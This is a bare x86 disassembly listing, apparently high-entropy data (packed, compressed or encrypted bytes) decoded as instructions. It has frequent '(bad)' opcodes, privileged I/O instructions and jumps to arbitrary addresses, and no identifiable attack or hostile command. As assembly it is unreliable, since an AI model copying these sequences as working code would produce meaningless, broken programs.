  41a811:	push   cs
  41a812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a813:	jp     0x41a82f
  41a815:	fld    DWORD PTR [eax-0x1e]
  41a818:	(bad)  
  41a819:	pop    esi
  41a81a:	ret    0x7bd1
  41a81d:	es mov edx,0xd8add1c5
  41a823:	jno    0x41a7d8
  41a825:	cmp    eax,0xc972c19f
  41a82a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a82b:	daa    
  41a82c:	stos   BYTE PTR es:[edi],al
  41a82d:	repnz hlt 
  41a82f:	pop    esi
  41a830:	mov    ebx,0x941f1684
  41a835:	and    eax,0x5eeb0f9f
  41a83a:	(bad)  
  41a83c:	mov    eax,0x8c367b47
  41a841:	sbb    eax,0xdc96dd76
  41a846:	cmc    
  41a847:	adc    esp,esp
  41a849:	mov    eax,ds:0x7b0da6bf
  41a84e:	call   0xc9a4a821
  41a853:	mov    cl,0x47
  41a855:	popa   
  41a856:	inc    ebx
  41a857:	leave  
  41a858:	cwde   
  41a859:	into   
  41a85a:	dec    esp
  41a85b:	out    0xae,eax
  41a85d:	push   esp
  41a85e:	sub    eax,0x77bafde5
  41a863:	jbe    0x41a8a5
  41a865:	inc    ecx
  41a866:	popf   
  41a867:	jbe    0x41a805
  41a869:	xchg   ch,ah
  41a86b:	das    
  41a86c:	pop    eax
  41a86d:	xor    eax,0x1af42697
  41a872:	mov    WORD PTR [ebx+0x25be85a3],gs
  41a878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a879:	ret    0xe3e1
  41a87c:	adc    esp,DWORD PTR [edi]
  41a87e:	jo     0x41a866
  41a880:	and    BYTE PTR [esi+0x11],bh
  41a883:	sti    
  41a884:	dec    eax
  41a885:	pop    edx
  41a886:	shl    ebx,0x4d
  41a889:	or     cl,cl
  41a88b:	popf   
  41a88c:	jne    0x41a8d7
  41a88e:	cwde   
  41a88f:	hlt    
  41a890:	adc    DWORD PTR [edi-0x5b982eae],ebx
  41a896:	or     ah,bh
  41a898:	je     0x41a881
  41a89a:	es stc 
  41a89c:	rol    DWORD PTR [ecx],1
  41a89e:	sub    al,0xc7
  41a8a0:	stc    
  41a8a1:	push   cs
  41a8a2:	jmp    0xacefd0e2
  41a8a7:	pop    es
  41a8a8:	cli    
  41a8a9:	xor    al,0x25
  41a8ab:	mov    cl,0xed
  41a8ad:	sub    edi,DWORD PTR [ecx+0x0]
  41a8b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8b1:	jp     0x41a90d
  41a8b3:	add    BYTE PTR [ecx],cl
	...
  41a915:	add    BYTE PTR ds:0xcf4a867e,dh
  41a91b:	cli    
  41a91c:	std    
  41a91d:	jg     0x41a90a
  41a91f:	mov    ds:0xacf0323e,al
  41a924:	repz add ebx,esi
  41a927:	pop    ss
  41a928:	add    DWORD PTR [eax],eax
  41a92a:	pop    es
  41a92b:	add    DWORD PTR [eax],eax
  41a92d:	add    BYTE PTR [edx],bh
  41a92f:	dec    ebp
  41a930:	add    eax,0xe51c0f33
  41a935:	test   BYTE PTR [ecx+0x101a5933],ah
  41a93b:	int3   
  41a93c:	dec    esp
  41a93d:	lock clc 
  41a93f:	or     DWORD PTR [eax-0x396ae294],ebp
  41a945:	test   BYTE PTR [ecx-0x7d],dl
  41a948:	ror    DWORD PTR [edx+0x76],cl
  41a94b:	sbb    cl,BYTE PTR [esi+0x2]
  41a94e:	popa   
  41a94f:	cmp    eax,0xc5bb79dd
  41a954:	ret    0xa292
  41a957:	xchg   edi,eax
  41a958:	cmp    dl,BYTE PTR [eax-0x6969dbfd]
  41a95e:	xchg   WORD PTR [ecx+eax*4+0x74f88de8],bp
  41a966:	push   ds
  41a967:	(bad)  [ebp+0x10]
  41a96a:	xor    eax,0xb2416160
  41a96f:	sbb    eax,0x816074cb
  41a974:	mov    bh,0xfa
  41a976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a977:	enter  0x9267,0x79
  41a97b:	sub    esp,ecx
  41a97d:	arpl   WORD PTR [ebx+0x3c],sp
  41a980:	pop    esp
  41a981:	adc    al,0x60
  41a983:	retf   0xe4c4
  41a986:	adc    edx,edx
  41a988:	xor    al,0xdf
  41a98a:	iret   
  41a98b:	test   BYTE PTR [eax-0x4463c8e1],dl
  41a991:	dec    ecx
  41a992:	pop    es
  41a993:	xor    al,0xcb
  41a995:	in     eax,dx
  41a996:	xor    BYTE PTR [eax+0x68],0x1
  41a99a:	or     al,0x8b
  41a99c:	pop    esp
  41a99d:	daa    
  41a99e:	inc    eax
  41a99f:	sbb    eax,0xca77155b
  41a9a4:	xchg   ebp,eax
  41a9a5:	cli    
  41a9a6:	cmp    al,BYTE PTR [ebp-0x1e]
  41a9a9:	mov    ss,WORD PTR [edx+0x6e]
  41a9ac:	lahf   
  41a9ad:	jge    0x41a970
  41a9af:	aas    
  41a9b0:	push   es
  41a9b1:	outs   dx,DWORD PTR ds:[esi]
  41a9b2:	push   ecx
  41a9b3:	adc    BYTE PTR [edi],bl
  41a9b5:	fnsave [esi-0x78]
  41a9b8:	repz xchg ebx,eax
  41a9ba:	call   0xa1649388
  41a9bf:	adc    ch,ah
  41a9c1:	xchg   ebp,eax
  41a9c2:	test   DWORD PTR [ecx+0x2e],eax
  41a9c5:	jnp    0x41a97f
  41a9c7:	sbb    edi,DWORD PTR [ecx+0x4a]
  41a9ca:	fild   WORD PTR [ecx+0x2a450c2]
  41a9d0:	jo     0x41a99d
  41a9d2:	out    dx,al
  41a9d3:	adc    DWORD PTR [edi-0x37c94b1a],0x5d28bed3
  41a9dd:	push   0xffffffcb
  41a9df:	xor    ecx,edx
  41a9e1:	ss mov ebx,cs
  41a9e4:	jbe    0x41a9eb
  41a9e6:	cmp    al,0xed
  41a9e8:	test   DWORD PTR [esi],ebp
  41a9ea:	retf   
  41a9eb:	inc    eax
  41a9ec:	outs   dx,DWORD PTR ds:[esi]
  41a9ed:	std    
  41a9ee:	sub    ch,al
  41a9f0:	rol    eax,0xd3
  41a9f3:	imul   eax,eax,0x715e82fb
  41a9f9:	pop    ecx
  41a9fa:	fstp   st(4)
  41a9fc:	les    ebx,FWORD PTR [ebp+0x78d7395b]
  41aa02:	add    cl,bl
  41aa04:	loopne 0x41aa48
  41aa06:	fld    DWORD PTR [ebx]
  41aa08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa09:	dec    esp
  41aa0a:	(bad)  
  41aa0b:	push   0xffffffb6
  41aa0d:	daa    
  41aa0e:	sbb    DWORD PTR [edx-0x4ce8f28f],eax
  41aa14:	mov    edi,0xe1b74743
  41aa19:	jge    0x41aa4e
  41aa1b:	pushf  
  41aa1c:	cpuid  
  41aa1e:	out    0x17,eax
  41aa20:	ficomp WORD PTR [edi+0x27]
  41aa23:	cli    
  41aa24:	sbb    esi,edx
  41aa26:	sbb    BYTE PTR [ecx],bl
  41aa28:	jecxz  0x41a9eb
  41aa2a:	push   ebp
  41aa2b:	sbb    eax,esi
  41aa2d:	call   0x631e02e9
  41aa32:	lods   al,BYTE PTR ds:[esi]
  41aa33:	loop   0x41aa40
	...
  41aa95:	add    bh,dh
  41aa97:	add    esp,ebx
  41aa99:	mov    ah,0xfe
  41aa9b:	std    
  41aa9c:	inc    DWORD PTR [ebx-0x4b]
  41aa9f:	mov    ds:0x9a46e277,al
  41aaa4:	pop    ebp
  41aaa5:	sub    esp,ebp
  41aaa7:	sbb    BYTE PTR [ecx],al
  41aaa9:	add    BYTE PTR [edi],al
  41aaab:	add    DWORD PTR [eax],eax
  41aaad:	add    BYTE PTR [edi+0x3bf1e3f9],dl
  41aab3:	ja     0x41aa87
  41aab5:	jmp    0x41ab14
  41aab7:	popf   
  41aab8:	std    
  41aab9:	das    
  41aaba:	mov    cl,0x96
  41aabc:	fistp  WORD PTR [ecx+0x57]
  41aabf:	fwait
  41aac0:	stos   BYTE PTR es:[edi],al
  41aac1:	jl     0x41ab1f
  41aac3:	dec    edi
  41aac4:	xchg   DWORD PTR [ebp+0x66024d9f],edi
  41aaca:	addr16 js 0x41ab1f
  41aacd:	pop    esi
  41aace:	push   esp
  41aacf:	mov    edx,0xda8808a9
  41aad4:	das    
  41aad5:	das    
  41aad6:	sbb    dh,bl
  41aad8:	xchg   ebx,eax
  41aad9:	inc    esp
  41aada:	push   0xffffff83
  41aadc:	out    0xf1,al
  41aade:	dec    edx
  41aadf:	lahf   
  41aae0:	cmp    BYTE PTR [ecx-0x27eb33d1],bl
  41aae6:	or     al,0x72
  41aae8:	leave  
  41aae9:	retf   
  41aaea:	jmp    0x97d2:0xb313f4e9
  41aaf1:	adc    ch,bh
  41aaf3:	loope  0x41ab4a
  41aaf5:	xchg   ecx,eax
  41aaf6:	cmp    dh,BYTE PTR [edi-0x35a82220]
  41aafc:	add    al,0x5b
  41aafe:	sti    
  41aaff:	inc    esp
  41ab00:	xor    BYTE PTR ds:0xa71e128f,dl
  41ab06:	jle    0x41aacf
  41ab08:	(bad)  
  41ab0a:	cmp    DWORD PTR [ebx],ecx
  41ab0c:	push   ebx
  41ab0d:	adc    eax,0xad27e424
  41ab13:	jp     0x41ab81
  41ab15:	xchg   ecx,eax
  41ab16:	push   ebp
  41ab17:	adc    eax,0x16a1603b
  41ab1c:	(bad)  
  41ab1e:	pop    edx
  41ab1f:	(bad)  
  41ab20:	jae    0x41ab07
  41ab22:	cmp    cl,dh
  41ab24:	test   DWORD PTR [ecx],ebp
  41ab26:	mov    bl,0xf8
  41ab28:	arpl   bp,bx
  41ab2a:	adc    BYTE PTR [edi-0x5a],bh
  41ab2d:	mov    ds:0xbce8915b,al
  41ab32:	cmp    dh,BYTE PTR [edi-0x136bd268]
  41ab38:	add    DWORD PTR [edx+0x3b],ebp
  41ab3b:	test   DWORD PTR gs:[edi+eax*2-0x1daedce3],edi
  41ab43:	push   0x18169673
  41ab48:	fwait
  41ab49:	add    BYTE PTR [edi+ebp*1],cl
  41ab4c:	push   edx
  41ab4d:	sbb    BYTE PTR [ebx+0x2e1adfe3],ah
  41ab53:	outs   dx,BYTE PTR ds:[esi]
  41ab54:	ss push 0xffffffe2
  41ab57:	pop    edx
  41ab58:	dec    ecx
  41ab59:	pop    ebx
  41ab5a:	xlat   BYTE PTR ds:[ebx]
  41ab5b:	aaa    
  41ab5c:	pop    esi
  41ab5d:	punpckhdq mm3,QWORD PTR [bp+0x9af]
  41ab63:	mov    ds:0x8603005a,eax
  41ab68:	dec    ch
  41ab6a:	std    
  41ab6b:	pop    ecx
  41ab6c:	ret    0x82cb
  41ab6f:	xor    DWORD PTR [esi+edi*1+0x7938dc77],ecx
  41ab76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab77:	push   ds
  41ab78:	dec    esp
  41ab79:	ror    BYTE PTR [esi-0x24],cl
  41ab7c:	pop    ds
  41ab7d:	in     al,dx
  41ab7e:	lods   eax,DWORD PTR ds:[esi]
  41ab7f:	test   ch,bh
  41ab81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab82:	mov    al,0x72
  41ab84:	inc    eax
  41ab85:	adc    al,0x1e
  41ab87:	xor    BYTE PTR [esp+eax*4-0x75],dl
  41ab8b:	loopne 0x41ab32
  41ab8d:	pop    ss
  41ab8e:	push   es
  41ab8f:	gs inc esi
  41ab91:	fdivr  QWORD PTR [ebp+0x1d0b9858]
  41ab97:	and    DWORD PTR [ebx*1-0x1855e5fd],esp
  41ab9e:	pop    ecx
  41ab9f:	or     eax,0x30dd881f
  41aba4:	xchg   ecx,eax
  41aba5:	sub    cl,BYTE PTR [edx+edi*1-0x3847ded9]
  41abac:	std    
  41abad:	push   ebp
  41abae:	inc    ebx
  41abaf:	aaa    
  41abb0:	adc    al,0xe8
  41abb2:	int    0xf5
  41abb4:	add    al,BYTE PTR [eax]
	...
  41ac16:	push   0x49
  41ac18:	es cmp al,0x27
  41ac1b:	jg     0x41ac97
  41ac1d:	pop    edi
  41ac1e:	pop    esp
  41ac1f:	mov    edx,0x7f89cc53
  41ac24:	adc    ch,BYTE PTR [edi+0x119ec]
  41ac2a:	pop    es
  41ac2b:	add    DWORD PTR [eax],eax
  41ac2d:	add    BYTE PTR [esi-0x5c2ee06c],al
  41ac33:	mov    esi,0xf354646c
  41ac38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac39:	cwde   
  41ac3a:	mov    edi,0x2d593374
  41ac3f:	mov    eax,ebp
  41ac41:	stos   BYTE PTR es:[edi],al
  41ac42:	jl     0x41ac54
  41ac44:	cmp    dh,BYTE PTR ds:0x36ec042e
  41ac4a:	mov    dh,0xe5
  41ac4c:	test   eax,0x8b5d965a
  41ac51:	icebp  
  41ac52:	rsqrtps xmm5,XMMWORD PTR [esi]
  41ac55:	sbb    ah,BYTE PTR [esi]
  41ac57:	jnp    0x41acb5
  41ac59:	mov    DWORD PTR [ebx],ecx
  41ac5b:	in     al,dx
  41ac5c:	pop    esp
  41ac5d:	sub    DWORD PTR [bp+si+0x7b],esi
  41ac62:	into   
  41ac63:	mov    DWORD PTR [edi-0x7d],edi
  41ac66:	mov    bh,ch
  41ac68:	sahf   
  41ac69:	das    
  41ac6a:	data16 out dx,al
  41ac6c:	mov    ds:0x2e7daafc,eax
  41ac71:	cmp    ecx,0x6a
  41ac74:	push   edx
  41ac75:	push   ecx
  41ac76:	mov    bh,ch
  41ac78:	es jns 0x41aca4
  41ac7b:	imul   eax,DWORD PTR [edx+0x7611ddd9],0x4b
  41ac82:	adc    eax,0xb23b74c5
  41ac87:	sahf   
  41ac88:	inc    edx
  41ac89:	scas   eax,DWORD PTR es:[edi]
  41ac8a:	cmp    cl,BYTE PTR [esi+0x30e88c75]
  41ac90:	ret    
  41ac91:	mov    edx,DWORD PTR [edi-0x79]
  41ac94:	mov    dl,ch
  41ac96:	push   ds
  41ac97:	mov    al,ds:0x24fedbf2
  41ac9c:	and    al,0x59
  41ac9f:	pushf  
  41aca0:	adc    al,BYTE PTR [esi+0x3f]
  41aca3:	jp     0x41acca
  41aca5:	adc    BYTE PTR [edx-0x18e11819],0x1e
  41acac:	sub    DWORD PTR [edx-0x9],0xffffff9b
  41acb0:	adc    ch,BYTE PTR [ebx+0x1c8ab905]
  41acb6:	(bad)  
  41acb8:	(bad)
  41acbb:	out    dx,eax
  41acbc:	ins    BYTE PTR es:[edi],dx
  41acbd:	cli    
  41acbe:	ja     0x41ad33
  41acc0:	mov    al,ds:0xa0dde6f4
  41acc5:	dec    esp
  41acc6:	cs sbb edx,0x1e
  41acca:	xor    ch,BYTE PTR [edx-0x674262dc]
  41acd0:	xchg   BYTE PTR [esi-0x1b],dh
  41acd3:	cmp    bh,BYTE PTR ds:0x23c5d412
  41acd9:	jge    0x41ac9b
  41acdb:	or     al,0xa2
  41acdd:	xchg   esi,eax
  41acde:	push   edx
  41acdf:	pop    ss
  41ace0:	add    ch,0x10
  41ace3:	ret    0x22f
  41ace6:	push   eax
  41ace7:	mov    eax,ds:0x25ddc797
  41acec:	mov    ds:0xed2477d6,al
  41acf1:	sub    al,0xf6
  41acf3:	mov    ds:0x6656000c,al
  41acf8:	cmp    al,bh
  41acfa:	je     0x41ace2
  41acfc:	inc    ecx
  41acfd:	retf   
  41acfe:	dec    ecx
  41acff:	retf   0xdbf
  41ad02:	cmc    
  41ad03:	daa    
  41ad04:	add    BYTE PTR [esi+ebx*4+0x5bcd5885],0x2d
  41ad0c:	add    eax,0x2b8c8228
  41ad11:	sub    DWORD PTR [edi-0x65],0xffffffa1
  41ad15:	and    DWORD PTR es:[eax],edx
  41ad18:	push   ss
  41ad19:	arpl   WORD PTR [edx-0x6e],di
  41ad1c:	inc    ebx
  41ad1d:	dec    edx
  41ad1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad1f:	xchg   ebp,eax
  41ad20:	sub    al,0x96
  41ad22:	in     eax,dx
  41ad23:	push   cs
  41ad24:	ins    BYTE PTR es:[edi],dx
  41ad25:	clc    
  41ad26:	inc    edi
  41ad27:	ret    
  41ad28:	adc    esi,DWORD PTR [ecx]
  41ad2a:	int    0xde
  41ad2c:	add    al,0x71
  41ad2e:	pop    eax
  41ad2f:	daa    
  41ad30:	sbb    BYTE PTR [ebx+0xcb2f86],dh
	...
  41ad96:	push   ebp
  41ad97:	clc    
  41ad98:	or     DWORD PTR [esi-0x4280053],ebx
  41ad9e:	mov    dh,BYTE PTR [eax+eax*4]
  41ada1:	add    ebp,DWORD PTR [eax]
  41ada3:	sub    DWORD PTR [ecx-0x6c],ebx
  41ada6:	repz sbb al,BYTE PTR [ecx]
  41ada9:	add    BYTE PTR [edi],al
  41adab:	add    DWORD PTR [eax],eax
  41adad:	add    BYTE PTR [ebp-0x6b1195fe],bh
  41adb3:	cmp    DWORD PTR [edx+0x41366f6d],ecx
  41adb9:	inc    esp
  41adba:	mov    ds:0x8b5d5dfa,al
  41adbf:	mov    ah,0xcd
  41adc1:	shr    DWORD PTR [ebx-0x1e],1
  41adc4:	lods   al,BYTE PTR ds:[esi]
  41adc5:	(bad)  
  41adc6:	je     0x41ad8c
  41adc8:	pop    ecx
  41adc9:	push   ecx
  41adca:	dec    edx
  41adcb:	mov    ds:0x901ce033,eax
  41add0:	(bad)  
  41add1:	sti    
  41add2:	push   esi
  41add3:	add    dh,bl
  41add5:	div    BYTE PTR [ebp+0xc09097b]
  41addb:	dec    eax
  41addc:	nop
  41addd:	sbb    BYTE PTR ds:0xbc907004,cl
  41ade3:	out    0x80,eax
  41ade5:	adc    edx,eax
  41ade7:	xchg   edx,eax
  41ade8:	sub    al,BYTE PTR [edx]
  41adea:	retf   
  41adeb:	add    BYTE PTR [esi],0x4a
  41adee:	sub    ecx,DWORD PTR [esi]
  41adf0:	xchg   BYTE PTR [edi-0x3f],ah
  41adf3:	pop    ebx
  41adf4:	mov    al,ds:0x8cfd2d4a
  41adf9:	pushf  
  41adfa:	cmp    dl,BYTE PTR [esi-0x13]
  41adfd:	(bad)  
  41adff:	pop    edi
  41ae00:	mov    eax,ds:0xfb395316
  41ae05:	dec    esi
  41ae06:	xchg   ebx,eax
  41ae07:	stc    
  41ae08:	pop    edi
  41ae09:	xor    BYTE PTR [edx-0x70ca35a7],ch
  41ae0f:	jnp    0x41ae4b
  41ae11:	(bad)  
  41ae12:	rcr    ebp,cl
  41ae14:	jo     0x41adc4
  41ae16:	test   BYTE PTR [edx-0x6ed22fdc],ah
  41ae1c:	in     eax,dx
  41ae1d:	iret   
  41ae1e:	pop    esp
  41ae1f:	dec    eax
  41ae20:	mov    WORD PTR [edx],ss
  41ae22:	push   ecx
  41ae23:	xchg   esp,eax
  41ae24:	mov    dh,0x22
  41ae26:	call   0xa14aafac
  41ae2b:	pusha  
  41ae2c:	cmp    BYTE PTR [ecx+0x2c147add],cl
  41ae32:	mov    esi,0x820d4bb6
  41ae37:	dec    edi
  41ae38:	pop    edx
  41ae39:	nop
  41ae3a:	or     esi,DWORD PTR [ecx-0x47f37d99]
  41ae40:	jae    0x41adf5
  41ae42:	adc    eax,0xba3ba9b0
  41ae47:	sbb    esi,DWORD PTR [ebp-0x19]
  41ae4a:	xchg   BYTE PTR ds:0x2de73d9,bl
  41ae50:	push   ecx
  41ae51:	arpl   WORD PTR [eax+ebp*1+0x3c],dx
  41ae55:	mov    ebx,0x58d3823a
  41ae5a:	fs leave 
  41ae5c:	jo     0x41ae5c
  41ae5e:	ins    BYTE PTR es:[edi],dx
  41ae5f:	lss    ebx,FWORD PTR [edi]
  41ae62:	test   edi,edi
  41ae64:	mov    edx,0x7cd6d08f
  41ae69:	lds    esp,FWORD PTR [esi]
  41ae6b:	(bad)  
  41ae6c:	shr    BYTE PTR [edi+0x6104fb23],cl
  41ae72:	push   ebp
  41ae73:	icebp  
  41ae74:	push   eax
  41ae75:	sbb    esp,DWORD PTR [ebx-0x5e]
  41ae78:	fwait
  41ae79:	add    DWORD PTR [ebx],ebx
  41ae7b:	popf   
  41ae7c:	or     DWORD PTR [esp+edx*2-0x7a93e0e8],ebx
  41ae83:	ror    bl,cl
  41ae85:	hlt    
  41ae86:	push   edi
  41ae87:	adc    BYTE PTR [esi-0x61327be0],dh
  41ae8d:	lods   al,BYTE PTR ds:[esi]
  41ae8e:	cli    
  41ae8f:	lahf   
  41ae90:	mov    cl,0x4
  41ae92:	rcr    BYTE PTR [esi+0x1a],cl
  41ae95:	outs   dx,DWORD PTR ds:[esi]
  41ae96:	and    al,0x84
  41ae98:	add    DWORD PTR ss:[eax],eax
  41ae9b:	add    esp,DWORD PTR [ecx+0x21]
  41ae9e:	ins    DWORD PTR es:[edi],dx
  41ae9f:	ins    DWORD PTR es:[edi],dx
  41aea0:	jb     0x41ae74
  41aea2:	jle    0x41ae85
  41aea4:	cmp    dh,al
  41aea6:	sbb    al,0x8b
  41aea8:	jg     0x41af01
  41aeaa:	jo     0x41ae50
  41aeac:	sbb    DWORD PTR [esi],edx
  41aeae:	push   esi
  41aeaf:	mov    eax,0x3fd791f4
  41aeb4:	xlat   BYTE PTR ds:[ebx]
	...
  41af15:	add    ch,al
  41af17:	stc    
  41af18:	lods   eax,DWORD PTR ds:[esi]
  41af19:	xor    edi,DWORD PTR [ebp+0x56ffdf77]
  41af1f:	xor    al,0x39
  41af21:	loop   0x41af28
  41af23:	test   BYTE PTR [edx+0x11bfa9d],bl
  41af29:	add    BYTE PTR [edi],al
  41af2b:	add    DWORD PTR [eax],eax
  41af2d:	add    dl,cl
  41af2f:	std    
  41af30:	addr16 xor al,0x43
  41af33:	mov    esp,0xf2e354c5
  41af38:	(bad)  
  41af39:	shr    BYTE PTR [edx+ebp*1-0x2a90cb19],cl
  41af40:	xchg   DWORD PTR [esi-0x5a],ebx
  41af43:	cmp    dh,dh
  41af45:	aam    0x8b
  41af47:	add    al,0xbd
  41af49:	jae    0x41af25
  41af4b:	sub    bl,cl
  41af4d:	dec    DWORD PTR [edx+ebp*4+0x4a]
  41af51:	sbb    dl,ah
  41af53:	pop    ecx
  41af54:	jnp    0x41aee2
  41af56:	repnz scas eax,DWORD PTR es:[edi]
  41af58:	add    al,0xd8
  41af5a:	adc    DWORD PTR [edx],0x74
  41af5d:	test   DWORD PTR [edx-0x68f24466],0xd1974d21
  41af67:	int3   
  41af68:	mov    cl,ch
  41af6a:	test   BYTE PTR [ebp-0x16],dl
  41af6d:	(bad)  
  41af6e:	mov    bh,0x5a
  41af70:	pop    esi
  41af71:	mov    cl,0x5f
  41af73:	push   edx
  41af74:	push   0xe010fda
  41af79:	push   es
  41af7a:	cmp    ebp,ecx
  41af7c:	nop
  41af7d:	test   al,0xa2
  41af7f:	in     al,0xde
  41af81:	dec    edx
  41af82:	(bad)
  41af85:	mov    esi,DWORD PTR [ecx]
  41af87:	pop    DWORD PTR [esi+0x57]
  41af8a:	jge    0x41af3a
  41af8c:	sahf   
  41af8d:	dec    edi
  41af8e:	inc    ecx
  41af8f:	inc    ebx
  41af90:	ins    BYTE PTR es:[edi],dx
  41af91:	pop    ebx
  41af92:	cmp    al,0xca
  41af94:	gs int3 
  41af96:	inc    ecx
  41af97:	mov    ebp,0x1a2ebcd8
  41af9c:	xchg   ebx,eax
  41af9d:	ss lahf 
  41af9f:	sub    ch,BYTE PTR [ecx]
  41afa1:	loopne 0x41af81
  41afa3:	in     eax,dx
  41afa4:	ror    BYTE PTR ds:0x7d8022cd,1
  41afaa:	push   ecx
  41afab:	test   BYTE PTR [edx+0x74cb4072],dh
  41afb1:	jae    0x41af7e
  41afb3:	rcl    BYTE PTR [esi],1
  41afb5:	std    
  41afb6:	cmp    BYTE PTR [edi-0x47],ah
  41afb9:	inc    ebx
  41afba:	sub    DWORD PTR [ecx],edx
  41afbc:	push   esp
  41afbd:	jmp    0x19f4b97a
  41afc2:	xchg   edx,eax
  41afc3:	sub    eax,0xb7436fcb
  41afc8:	lods   eax,DWORD PTR ds:[esi]
  41afc9:	jle    0x41af8f
  41afcb:	sti    
  41afcc:	stos   BYTE PTR es:[edi],al
  41afcd:	into   
  41afce:	pop    ss
  41afcf:	in     al,0x7c
  41afd1:	retf   
  41afd2:	cmp    al,0x7d
  41afd4:	mov    ecx,0x589d25db
  41afd9:	ins    BYTE PTR es:[edi],dx
  41afda:	fdiv   st,st(6)
  41afdc:	sbb    ecx,DWORD PTR [esi-0x4b]
  41afdf:	mov    cl,BYTE PTR [ebx+edi*1]
  41afe2:	pop    ebx
  41afe3:	mov    ds:0x6e6279b,eax
  41afe8:	xor    ebp,DWORD PTR [eax]
  41afea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afeb:	fs pop edi
  41afed:	inc    edx
  41afee:	aam    0xde
  41aff0:	xchg   DWORD PTR [edi+0x1a5704c0],ebx
  41aff6:	ins    DWORD PTR es:[edi],dx
  41aff7:	frndint 
  41aff9:	jo     0x41b016
  41affb:	cs dec ecx
  41affd:	mov    al,0x54
  41afff:	or     eax,0x2158c389
  41b004:	ja     0x41b04b
  41b006:	mov    al,dl
  41b008:	mov    ds:0x9709f8a1,eax
  41b00d:	test   BYTE PTR [ebp+0xa79fe51],al
  41b013:	cmp    BYTE PTR ds:0xce45d52d,0x25
  41b01a:	pop    ebx
  41b01b:	inc    esi
  41b01c:	loop   0x41b060
  41b01e:	sbb    dl,BYTE PTR [esi-0x6e]
  41b021:	mov    esp,0xde7ab2a1
  41b026:	add    eax,0xe202004d
  41b02b:	add    DWORD PTR [ebp-0x67],edx
  41b02e:	das    
  41b02f:	mov    dh,BYTE PTR [eax]
  41b031:	pop    edi
  41b032:	jne    0x41afb5
  41b034:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  41b095:	add    dh,al
  41b097:	ficom  WORD PTR [eax]
  41b099:	stos   DWORD PTR es:[edi],eax
  41b09a:	sbb    bh,ch
  41b09c:	(bad)  
  41b09d:	jmp    DWORD PTR [eax]
  41b09f:	jmp    FWORD PTR [esi+0x3ca1af31]
  41b0a5:	ja     0x41b0a8
  41b0a7:	sbb    eax,0x1070001
  41b0ac:	add    BYTE PTR [eax],al
  41b0ae:	pop    edi
  41b0af:	mov    bh,0x37
  41b0b1:	push   ecx
  41b0b2:	xor    eax,0xb7149808
  41b0b7:	in     eax,0xae
  41b0b9:	push   0x4592b8df
  41b0be:	push   esp
  41b0bf:	xchg   DWORD PTR [edx+0x6a],ebp
  41b0c2:	mov    ah,0xad
  41b0c4:	inc    ecx
  41b0c5:	test   DWORD PTR [eax+0x2e],ecx
  41b0c8:	adc    bh,al
  41b0ca:	push   ecx
  41b0cb:	inc    ebx
  41b0cc:	jg     0x41b0e6
  41b0ce:	loop   0x41b14d
  41b0d0:	pop    edx
  41b0d1:	repz jmp 0x41b0d8
  41b0d4:	add    eax,DWORD PTR [ebx]
  41b0d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0d8:	addr16 push ss
  41b0da:	dec    esp
  41b0db:	retf   
  41b0dc:	sbb    ah,bl
  41b0de:	sahf   
  41b0df:	jmp    0xefcc281b
  41b0e4:	push   ebp
  41b0e5:	nop
  41b0e6:	or     DWORD PTR [edx+0x44cfbcb3],eax
  41b0ec:	fisttp QWORD PTR [ebx-0x3f42a25e]
  41b0f2:	out    0xf,al
  41b0f4:	rcl    DWORD PTR [ecx+edi*8],0x42
  41b0f8:	(bad)  
  41b0f9:	fsub   DWORD PTR [esi+0x13]
  41b0fc:	jns    0x41b15c
  41b0fe:	mov    eax,0xdf1fd256
  41b103:	in     eax,0xe1
  41b105:	daa    
  41b106:	mov    ebp,0x82166d0e
  41b10b:	add    bl,dh
  41b10d:	loopne 0x41b109
  41b10f:	pop    edx
  41b110:	mov    eax,ds:0xd2fb6346
  41b115:	out    dx,eax
  41b116:	sbb    dh,BYTE PTR [ecx]
  41b118:	imul   edx,DWORD PTR [esi+eiz*4-0x30],0xfffffff2
  41b11d:	ror    BYTE PTR [esi+0x94d0ceb],1
  41b123:	mov    ds:0x63ad4abc,al
  41b128:	outs   dx,BYTE PTR ds:[esi]
  41b129:	hlt    
  41b12a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b12b:	mov    dl,0xfb
  41b12d:	in     eax,0x5c
  41b12f:	leave  
  41b130:	mov    ebp,0x242d1361
  41b135:	ror    DWORD PTR [esi+ecx*2],cl
  41b138:	xchg   edi,eax
  41b139:	jae    0x41b10f
  41b13b:	enter  0xd9a6,0xc1
  41b13f:	(bad)  
  41b140:	les    edi,FWORD PTR [ebp-0x1c5016b2]
  41b146:	dec    eax
  41b147:	out    dx,eax
  41b148:	sub    BYTE PTR [ebx+0x7f678133],ah
  41b14e:	push   cs
  41b14f:	add    al,0xfa
  41b151:	xor    ebp,DWORD PTR [esi]
  41b153:	add    al,0x51
  41b155:	loop   0x41b1a8
  41b157:	jl     0x41b1b6
  41b159:	mov    edi,0x97fd5b09
  41b15e:	inc    ebp
  41b15f:	loope  0x41b1bd
  41b161:	sti    
  41b162:	sub    cl,BYTE PTR [ebx-0x22]
  41b165:	frstor [ebp-0x73138d16]
  41b16b:	sub    al,0xb2
  41b16d:	push   ebp
  41b16e:	and    cl,bl
  41b170:	ror    bl,0xbc
  41b173:	push   0xffffff9d
  41b175:	mov    DWORD PTR [edi+0x15],esi
  41b178:	xchg   edx,eax
  41b179:	loop   0x41b190
  41b17b:	retf   0xdf20
  41b17e:	outs   dx,DWORD PTR ds:[esi]
  41b17f:	imul   esp,DWORD PTR [edx],0x43
  41b182:	je     0x41b1e2
  41b184:	sti    
  41b185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b186:	data16 lods al,BYTE PTR ds:[esi]
